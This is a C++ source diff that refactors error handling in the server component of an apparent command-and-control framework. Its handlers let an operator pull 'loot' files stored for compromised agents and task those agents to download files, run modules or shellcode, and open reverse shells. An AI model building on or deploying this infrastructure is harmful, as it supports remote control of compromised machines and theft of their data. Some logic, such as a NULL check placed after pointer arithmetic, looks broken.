@@ -12,7 +12,7 @@ ConnectionInstance::~ConnectionInstance(){
 }
 
 /*Handler for manager connections and flow*/
-void ConnectionInstance::manager_handler() {
+int ConnectionInstance::manager_handler() {
     int operation;
     int quitting = 0;
     int count = 0;
@@ -25,6 +25,13 @@ void ConnectionInstance::manager_handler() {
     char *resp = (char *)malloc(2048);
     char buff[BUFSIZ];
             
+
+    if(!this->api_check(this->transport->get_agent_name(this->data)))
+    {
+        return 1;
+    }
+
+    this->agent_name = (char *)this->data;
     // main instruction loop
     while (!quitting)
     {
@@ -40,7 +47,7 @@ void ConnectionInstance::manager_handler() {
         memset(tmpbf, 0, sizeof(tmpbf));
         
         // get operation request
-        this->transport->read(this->data, &resp, 2048);
+        if(!this->api_check(this->transport->read(this->data, &resp, 2048))) break;
         printf("response: %s\n", resp);
         
         // parse it
@@ -48,7 +55,9 @@ void ConnectionInstance::manager_handler() {
         operation = atoi(tmpbf);
         ptr += 3;
 
-        this->log("Operation caught: %d\n", this->transport->get_agent_name(this->data), operation);
+        this->log("Operation caught: %d\n", 
+                (char *)this->data,
+                operation);
 
         // main switch
         switch (operation)
@@ -60,7 +69,7 @@ void ConnectionInstance::manager_handler() {
 
             // Manager wants all of the loot
         case MANAG_GET_LOOT:
-            this->send_loot(ptr);
+            if(!this->send_loot(ptr)) quitting = true;
             break;
 
             // Manager wants to give the agent a file
@@ -68,8 +77,9 @@ void ConnectionInstance::manager_handler() {
             // Agent_id is stored in ptr
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                this->log("Caught wrong format identifier in input\n", this->transport->get_agent_name(this->data));
-                return;
+                this->log("Caught wrong format identifier in input\n", 
+                            this->agent_name);
+                return 1;
             }
 
             // splits the options to find path to target file 
@@ -77,15 +87,17 @@ void ConnectionInstance::manager_handler() {
             dat_ptr = misc_substring(ptr, count);
             
             // gets file from manager
-            this->download_file(d_ptr, 1, dat_ptr);
+            if(!this->download_file(d_ptr, 1, dat_ptr)) quitting = true;
 
             // tells the agent to download it 
-            AgentInformationHandler::task(AGENT_DOWN_FILE, dat_ptr, d_ptr);
+            if(!AgentInformationHandler::task(AGENT_DOWN_FILE, 
+                                            dat_ptr, d_ptr)) quitting = true;
             break;
 
             // Manager wants agent to start a reverse shell
         case MANAG_REQ_RVSH:
-            AgentInformationHandler::task(AGENT_REV_SHELL, dat_ptr, d_ptr);
+            if(!AgentInformationHandler::task(AGENT_REV_SHELL, 
+                                            dat_ptr, d_ptr)) quitting = true;
             break;
 
             // Manager wants agent to run a binary module
@@ -94,17 +106,18 @@ void ConnectionInstance::manager_handler() {
             // Agent_id is stored in ptr 
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
-                return;
+                this->log("Wrong format identifier from input\n", this->agent_name);
+                return 1;
             }
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count);
             
             // gets file from Manager
-            this->download_file(d_ptr, 1, dat_ptr);
+            if(!this->download_file(d_ptr, 1, dat_ptr)) quitting = true;
             
             // task agent
-            AgentInformationHandler::task(AGENT_EXEC_MODULE, dat_ptr, d_ptr);
+            if(!AgentInformationHandler::task(AGENT_EXEC_MODULE, 
+                                            dat_ptr, d_ptr)) quitting = true;
             break;
 
             // Manager wants to check if loot is available 
@@ -124,18 +137,20 @@ void ConnectionInstance::manager_handler() {
             // by the end, filename is in d_ptr and agent is in dat_ptr
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
-                return;
+                this->log("Wrong format identifier from input\n", this->agent_name);
+                return 1;
             }
 
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count);
             if(!AgentInformationHandler::task(AGENT_UP_FILE, dat_ptr, d_ptr)) {
                 // Tells server tasking was successfully assigned 
-                this->transport->send_ok(this->data);
+                if(!this->api_check(this->transport->send_ok(this->data)))
+                    quitting = true;
             } else {
                 // Tasking failed for some reason
-                this->transport->send_err(this->data);
+                if(!this->api_check(this->transport->send_err(this->data)))
+                    quitting = true;
             }
             
             break;
@@ -144,35 +159,22 @@ void ConnectionInstance::manager_handler() {
         case MANAG_TASK_SC:
             d_ptr = strchr(ptr, ':') +1;
             if(d_ptr == NULL){
-                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
-                return;
+                this->log("Wrong format identifier from input\n", this->agent_name);
+                return 1;
             }
             count = misc_index_of(ptr, ':', 0);
             dat_ptr = misc_substring(ptr, count);
             
             if(!AgentInformationHandler::task(AGENT_EXEC_SC, dat_ptr, d_ptr)){
                // Tells server tasking was successfully assigned 
-                this->transport->send_ok(this->data);
+                if(!this->api_check(this->transport->send_ok(this->data)))
+                    quitting = true;
             } else {
                 // Tasking failed for some reason
-                this->transport->send_err(this->data);
+                if(!this->api_check(this->transport->send_err(this->data)))
+                    quitting = true;
             }
             break;
-
-        // rethinking this... dont think the server really needs to know how this works
-       /* case MANAG_GET_AGENT:
-            d_ptr = strchr(ptr, ':') +1;
-            if(d_ptr == NULL){
-                this->log("Wrong format identifier from input\n", this->transport->get_agent_name(this->data));
-                return;
-            }
-            count = misc_index_of(ptr, ':', 0);
-            dat_ptr = misc_substring(ptr, count, strlen(ptr));
-
-            this->transport->make_agent(this->data, dat_ptr, d_ptr);
-            dat_ptr = NULL;
-            this->transport->upload_file(this->data, "out/client.out", 0);
-            break;*/
 
             // Manager wants to register a new agent
         case MANAG_REG_AGENT:
@@ -183,15 +185,16 @@ void ConnectionInstance::manager_handler() {
             */
 
             break;
+
             // Manager wants an agent's information
         case MANAG_GET_INFO:
-            this->send_info(ptr);
+            if(!this->send_info(ptr)) quitting = true;
             break;
 
             // Manager wants all active ports on the server 
             // This is so it can connect to open agent shells
         case MANAG_REQ_PORTS:
-            this->get_ports(ptr);
+            if(!this->get_ports(ptr)) quitting = true;
             break;
 
             // Manager wants to connect to available reverse shell
@@ -211,7 +214,7 @@ void ConnectionInstance::manager_handler() {
 
             // Unknown operation
         default:
-            this->log("Unknown operation value '%d'\n", this->transport->get_agent_name(this->data), operation);
+            this->log("Unknown operation value '%d'\n", this->agent_name, operation);
             this->transport->send_err(this->data);
             break;
         }
@@ -221,6 +224,7 @@ void ConnectionInstance::manager_handler() {
     free(resp);
     printf("Thread exiting...\n");
     
+    return 0;
 }
 
 /*Sends agent information to manager*/
@@ -261,7 +265,7 @@ int ConnectionInstance::send_info(char *ptr){
                 // check if file was opened successfully 
                 if(file == NULL){
                     // if not, log it and continue to the next directory 
-                    this->log("Could not get info on agent %s\n", this->transport->get_agent_name(this->data), ent->d_name);
+                    this->log("Could not get info on agent %s\n", this->agent_name, ent->d_name);
                     perror("");
                 } else {
 
@@ -278,37 +282,26 @@ int ConnectionInstance::send_info(char *ptr){
                     printf("File data: %s\n", dat);
                     
                     // Write the data to transport and free it
-                    rc = this->transport->write(this->data, dat, size);
+                    if(!this->api_check(this->transport->write(this->data, dat, size))) return 1;
                     free(dat);
 
-
-                    if(rc == 1){
-                        this->log("Failed to write data\n", this->transport->get_agent_name(this->data));
-                        return 1;
-                    }
                     
                     // get response. this is here to keep send/read order 
                     // and avoid lockups due to both ends reading together
-                    rc = this->transport->read(this->data, &tmpbf, 3);
-                    if(rc == 1){
-                        this->log("Failed to read data\n", this->transport->get_agent_name(this->data));
-                        return 1;
-                    }
+                    if(!this->api_check(this->transport->read(this->data, &tmpbf, 3))) return 1;
+                    
                 }
             }
         }
 
         // Tell the manager we are done
-        rc = this->transport->write(this->data, "fi", 2);
-        if(rc == 1){
-            this->log("Failed to write data\n", this->transport->get_agent_name(this->data));
-            return 1;
-        }
+        if(!this->api_check(this->transport->write(this->data, "fi", 2))) return 1;
+        
         // close directory 
         closedir (dir);
     } else {
         // could not open directory
-        this->log("Failed to open directory\n", this->transport->get_agent_name(this->data));
+        this->log("Failed to open directory\n", this->agent_name);
             
         perror ("");
         return 2;
@@ -329,44 +322,33 @@ int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
 
 
     // Say we are ready for receiving data 
-    rc = this->transport->send_ok(this->data);
-    if(rc == 1){
-        this->log("Failed to write transport data\n", this->transport->get_agent_name(this->data));
-        return 1;
-    }
+    if(!this->api_check(this->transport->send_ok(this->data))) return 1;
+
 
     // read the size of the file from target
     memset(tmpbuffer, 0, sizeof(tmpbuffer));
-    rc = this->transport->read(this->data, (char**)&tmpbuffer, sizeof(tmpbuffer));
-    if(rc == 1){
-        this->log("Failed to read transport data\n", this->transport->get_agent_name(this->data));
-        return 1;
-    }
-
+    if(!this->api_check(this->transport->read(this->data, 
+                        (char**)&tmpbuffer, 
+                        sizeof(tmpbuffer)))) return 1;
+    
     // convert string to integer and allocate sufficient memory
     size = atoi(tmpbuffer);
     data_ptr = (const char *)malloc(size+1);
     memset((void*)data_ptr, 0, size+1);
             
     // ready for data 
-    rc = this->transport->send_ok(this->data);
-    if(rc == 1){
-        this->log("Failed to write transport data\n", this->transport->get_agent_name(this->data));
-        return 1;
-    }
+    if(!this->api_check(this->transport->send_ok(this->data))) return 1;
 
     // read data until we have read `size` bytes
     size_t tmpint = 0;
     while (tmpint < size)
     {
-        rc = this->transport->read(this->data, (char **)&data_ptr+strlen(data_ptr), size-tmpint);
-        if(rc == 1){
-            this->log("Failed to read transport data\n", this->transport->get_agent_name(this->data));
-            return 1;
-        }
+        if(!this->api_check(this->transport->read(this->data, 
+                                        (char **)&data_ptr+strlen(data_ptr), 
+                                        size-tmpint))) return 1;
         
         // add received bytes to total
-        tmpint += rc;
+        tmpint += (int)this->data;
     
     }
     
@@ -378,16 +360,13 @@ int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
     if(!B64::decode(data_ptr, enc_ptr, size_e)){
         
         // Failed
-        this->log("Failed to decode data\n", this->transport->get_agent_name(this->data));
+        this->log("Failed to decode data\n", this->agent_name);
         free((void*)data_ptr);
         free(enc_ptr);
 
         // tell endpoint we failed
-        rc = this->transport->send_err(this->data);
-        if(rc == 1){
-            this->log("Failed to write transport data\n", this->transport->get_agent_name(this->data));
-            return 1;
-        }
+        if(!this->api_check(this->transport->send_err(this->data))) return 1;
+        
         return 1;
     }
 
@@ -395,11 +374,8 @@ int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
     free((void*)data_ptr);
             
     // say we got it successfully
-    rc = this->transport->send_ok(this->data);
-    if(rc == 1){
-        this->log("Failed to read transport data\n", this->transport->get_agent_name(this->data));
-        return 1;
-    }
+    if(!this->api_check(this->transport->send_ok(this->data))) return 1;
+    
 
     memset(buff, 0, sizeof(buff));
     memset(tmpbuffer, 0, sizeof(tmpbuffer));
@@ -409,7 +385,7 @@ int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
     if(is_manager){
         sprintf(buff, "%s/agents/%s/tasking/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), extra, ptr);
     } else {
-        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), this->transport->get_agent_name(this->data), ptr);
+        sprintf(buff, "%s/agents/%s/loot/%s", getcwd(tmpbuffer, sizeof(tmpbuffer)), this->agent_name, ptr);
     }
     
     // open file
@@ -432,16 +408,16 @@ int ConnectionInstance::download_file(char *ptr, int is_manager, char *extra){
 
 
 /* Returns all available ports for accessing reverse shells */
-void ConnectionInstance::get_ports(char *ptr){
+int ConnectionInstance::get_ports(char *ptr){
 
     /*
     UNIMPLEMENTED
     */
-
+   return 0;
 }
 
 /* Sends information about available transport backends*/
-void ConnectionInstance::send_transports(){
+int ConnectionInstance::send_transports(){
     printf("Sending transports\n");
     char *buff = (char*)malloc(2048);
     std::vector<int> *tmp_id_vec = server->get_handle_ids();
@@ -467,13 +443,19 @@ void ConnectionInstance::send_transports(){
         printf("Size: %s, String: %s\n", sz, buff);
 
         // write size
-        this->transport->write(this->data, sz, 5);
+        if(!this->api_check(this->transport->write(this->data, sz, 5))) 
+            return 1;
         memset(sz, 0, 5);
-        this->transport->read(this->data, &sz, 3);
+        if(!this->api_check(this->transport->read(this->data, &sz, 3)))
+            return 1;
 
         // write data
-        this->transport->write(this->data, buff, strlen(buff));
-        this->transport->read(this->data, &buff, 3);
+        if(!this->api_check(this->transport->write(this->data, 
+                            buff, strlen(buff)))) return 1;
+        
+        
+        if(!this->api_check(this->transport->read(this->data, &buff, 3))) 
+            return 1;
         i++;
     }
 
@@ -481,20 +463,16 @@ void ConnectionInstance::send_transports(){
     free(sz);
     
     // tell manager we are done
-    int rc = this->transport->write(this->data, "fi", 2);
-    if(rc == 1){
-        this->log("Failed to write data\n", this->transport->get_agent_name(this->data));
-        this->transport->read(this->data, &buff, 3);
-        return;
-    }
-    this->transport->read(this->data, &buff, 3);
+    if(!this->api_check(this->transport->write(this->data, "fi", 2))) return 1;
+    
+    if(!this->api_check(this->transport->read(this->data, &buff, 3))) return 1;
         
     
-    return;
+    return 0;
 }
 
 /* Initiates the connection between a manager and connected agent*/
-void ConnectionInstance::reverse_shell(){
+int ConnectionInstance::reverse_shell(){
     printf("Waiting for shell handling...\n");
 
     /*
@@ -502,10 +480,12 @@ void ConnectionInstance::reverse_shell(){
     */
 
     while(this->shell_finished) sleep(1);
+
+    return 1;
 }
 
 /*Handler for agent connections and flow*/
-void ConnectionInstance::agent_handler(){    
+int ConnectionInstance::agent_handler(){    
     // initialize variables
     int operation = 0;
     int quitting = 0;
@@ -530,7 +510,8 @@ void ConnectionInstance::agent_handler(){
         memset((void*)logbuff, 0, sizeof(logbuff));
         
         // gets the agent's requested tasking operation
-        this->transport->read(this->data, &resp, 2048);
+        if(!this->api_check(this->transport->read(this->data, &resp, 2048))) 
+            return 1;
         
         // parses operation into buffers
         //printf("Requested tasking: %s\n", resp);
@@ -548,21 +529,22 @@ void ConnectionInstance::agent_handler(){
                 NULL
         */
 
-        this->log("Operation caught: %d\n", this->transport->get_agent_name(this->data), operation);
+        this->log("Operation caught: %d\n", this->agent_name, operation);
 
         // main decision switch
         switch (operation)
         {
             // Agent wants to exit
         case AGENT_EXIT:
-            this->log("Client exiting...\n", this->transport->get_agent_name(this->data)); 
+            this->log("Client exiting...\n", this->agent_name); 
             quitting = 1;
             break;
 
             // Agent wants to download tasked file
         case AGENT_DOWN_FILE:
-            sprintf(buff, "agents/%s/tasking/%s", this->transport->get_agent_name(this->data), ptr);
-            this->transport->upload_file(this->data, buff, 0);
+            sprintf(buff, "agents/%s/tasking/%s", this->agent_name, ptr);
+            if(!this->api_check(this->transport->upload_file(this->data, buff, 0)))
+                return 1;
             break;
 
             // Agent wants to upload a loot file
@@ -572,26 +554,30 @@ void ConnectionInstance::agent_handler(){
 
             // Agent wants to initialize a reverse shell
         case AGENT_REV_SHELL:
-            this->log("Agent reverse shell caught\n", this->transport->get_agent_name(this->data));
+            this->log("Agent reverse shell caught\n", this->agent_name);
             //this->server->get_shell_queue()->push(this);
             //this->reverse_shell();
             break;
 
             // Agent wants to download and execute a module
         case AGENT_EXEC_MODULE:
-            sprintf(buff, "agents/%s/tasking/%s", this->transport->get_agent_name(this->data), ptr);
-            this->transport->upload_file(this->data, buff, 1);
+            sprintf(buff, "agents/%s/tasking/%s", this->agent_name, ptr);
+            if(!this->api_check(this->transport->upload_file(this->data, buff, 1)))
+                return 1;
             break;
 
             // unknown operation request
         default:
-            this->log("Unknown Operation Identifier: '%d'\n", this->transport->get_agent_name(this->data), operation);
-            this->transport->send_err(this->data);
+            this->log("Unknown Operation Identifier: '%d'\n", this->agent_name, operation);
+            if(!this->api_check(this->transport->send_err(this->data))) 
+                return 1;
             quitting = 1;
             break;
         }
     }
     free(resp);
+
+    return 0;
 }
 
 /* Let instance know that the reverse shell is done*/
@@ -606,7 +592,9 @@ int ConnectionInstance::handle_connection(){
     
 
     // creates classes and instances
-    int handler = this->transport->determine_handler(this->data);
+    if(!this->api_check(this->transport->determine_handler(this->data))) 
+        return 1;
+    int handler = (int) this->api_data;
 
     // determines handler to use
     if (handler == AGENT_TYPE) {
@@ -624,7 +612,7 @@ int ConnectionInstance::handle_connection(){
 }
 
 /* Starts a new transport on the server */
-void ConnectionInstance::setup_transport(char *inf){
+int ConnectionInstance::setup_transport(char *inf){
     printf("Setting up transports\n");
     
 
@@ -667,12 +655,12 @@ int ConnectionInstance::send_loot(char *ptr){
     memset(name, 0, sizeof(name));
     memset(logbuff, 0, sizeof(logbuff));
     
-    this->log("Sending loot\n", this->transport->get_agent_name(this->data));
+    this->log("Sending loot\n", this->agent_name);
     
 
     // open the target loot directory
     count = 0;
-    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), this->transport->get_agent_name(this->data));
+    sprintf(buff, "%s/agents/%s/loot", getcwd(name, sizeof(name)), this->agent_name);
     
     // Count the number of files in the dir
     if((dir = opendir(buff)) != NULL){
@@ -688,17 +676,12 @@ int ConnectionInstance::send_loot(char *ptr){
         sprintf(name, "%d", count);
 
         // write count to transport     
-        rc = this->transport->write(this->data, name, strlen(name));
-        if(rc != 0){
-            this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
-            return 1;
-        }
-
-        rc = this->transport->read(this->data, (char**)&tmpbf, 3);//rd
-        if(rc != 0){
-            this->log("Failed to read data from client\n", this->transport->get_agent_name(this->data));
-            return 1;
-        }
+        if(!this->api_check(this->transport->write(this->data, name, 
+                            strlen(name)))) return 1;
+        
+        if(!this->api_check(this->transport->read(this->data, (char**)&tmpbf, 
+                            3))) return 1;//rd
+        
 
         // If there is nothing to, return
         if(count == 0) return 0;
@@ -719,30 +702,26 @@ int ConnectionInstance::send_loot(char *ptr){
 
                 // get the file name and open it 
                 memset(buff, 0, sizeof(buff));
-                sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), this->transport->get_agent_name(this->data), ent->d_name);
+                sprintf(buff, "%s/agents/%s/loot/%s", getcwd(name, sizeof(name)), this->agent_name, ent->d_name);
                 
                 
                 file = fopen(buff, "r");
                 if(!file){
-                    this->log("Failed to open loot file", this->transport->get_agent_name(this->data));
+                    this->log("Failed to open loot file", this->agent_name);
                     perror("");
-                    this->transport->send_err(this->data);
+                    if(!this->api_check(this->transport->send_err(this->data)))
+                        return 1;
                     return 1;
                 }
                 
                 // writes the file name to transport 
-                rc = this->transport->write(this->data, ent->d_name, strlen(ent->d_name));
-                if(rc != 0){
-                    this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
-                    return 1;
-                }
+                if(!this->api_check(this->transport->write(this->data, 
+                                        ent->d_name, strlen(ent->d_name)))
+                    ) return 1;
 
-                rc = this->transport->read(this->data, (char**)&tmpbf, 3); //ok
-                if(rc != 0){
-                    this->log("Failed to read data from client\n", this->transport->get_agent_name(this->data));
-                    return 1;
-                }
-
+                if(!this->api_check(this->transport->read(this->data, 
+                                            (char**)&tmpbf, 3))
+                    ) return 1;
                 
                 
                 ctr++;
@@ -774,25 +753,21 @@ int ConnectionInstance::send_loot(char *ptr){
                 sprintf(buff, "%d", size_e);
                 
                 // write encoded size to transport 
-                rc = this->transport->write(this->data, buff, strlen(buff));
-                if(rc != 0){
-                    this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
-                    return 1;
-                }
+                if(!this->api_check(this->transport->write(this->data, buff, 
+                                        strlen(buff)))
+                    ) return 1;
+                
 
-                rc = this->transport->read(this->data, (char**)&tmpbf, 3);//ok
-                if(rc != 0){
-                    this->log("Failed to read from client\n", this->transport->get_agent_name(this->data));
-                    return 1;
-                }
+                if(!this->api_check(this->transport->read(this->data, 
+                                    (char**)&tmpbf, 3))
+                    ) return 1;//ok
                 
 
                 // write encoded data to transport 
-                rc = this->transport->write(this->data, tmp_ptr2, strlen(tmp_ptr2));
-                if(rc != 0){
-                    this->log("Failed to write to client\n", this->transport->get_agent_name(this->data));
-                    return 1;
-                }
+                if(!this->api_check(this->transport->write(this->data, 
+                                    tmp_ptr2, strlen(tmp_ptr2)))
+                    ) return 1;
+                
 
                 // free data
                 free(tmp_ptr2);
@@ -803,29 +778,21 @@ int ConnectionInstance::send_loot(char *ptr){
                     printf("Finished writing loot to channel\n");
                     
                     // tell endpoint we are done here
-                    rc = this->transport->write(this->data, "fi", 3);
-                    if(rc != 0){
-                        this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
-                        return 1;
-                    }
+                    if(!this->api_check(this->transport->write(this->data, 
+                                        "fi", 3))
+                        ) return 1;
 
                     break;
                 }                             
                 
                 // tell endpoint we have more
-                rc = this->transport->write(this->data, "nx", 3);
-                if(rc != 0){
-                    this->log("Failed to write data to client\n", this->transport->get_agent_name(this->data));
-                    return 1;
-                }
-
-                rc = this->transport->read(this->data, (char**)&tmpbf, 3); //rd
-                if(rc != 0){
-                    this->log("Failed to read data from client\n", this->transport->get_agent_name(this->data));
-                    return 1;
-                }
-                printf("Read from channel\n");
-            
+                if(!this->api_check(this->transport->write(this->data, 
+                                    "nx", 3))
+                    ) return 1;
+                
+                if(!this->api_check(this->transport->read(this->data, 
+                                    (char**)&tmpbf, 3))
+                    ) return 1; //rd
             }
         }
     
